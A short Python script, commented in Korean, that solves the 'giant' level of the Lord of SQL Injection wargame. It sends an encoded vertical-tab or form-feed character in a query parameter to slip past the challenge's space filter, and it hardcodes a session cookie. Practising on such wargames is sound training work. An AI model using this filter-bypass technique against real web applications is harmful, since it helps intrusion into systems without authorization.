# - *- coding : UTF-8 -*-
from requests import get
import random

#URL을 설정합니다.
url = "http://los.eagle-jump.org/giant_9e5c61fc7f0711c680a4bf2553ee60bb.php"

#유효한 개행 문자들을 저장합니다.
new_tab = ["%0b", "%0c"]

#위의 개행 문자 둘 중 하나를 선택합니다.
rand_int = random.randint(0,1)
param = "?shit=" + new_tab[rand_int]
new_url = url + param

#쿠키를 설정합니다. 쿠키는 반드시 자신의 것이어야합니다.
cookies = dict(PHPSESSID="5u71g5vp7547tv8ffl7osl0fl5")


#HTTP 요청을 보냅니다.
r = get(new_url, cookies=cookies)

if r.text.find("<h2>GIANT Clear!</h2>") > 0:
    print("축하합니다! Giant을 클리어했습니다!")
    
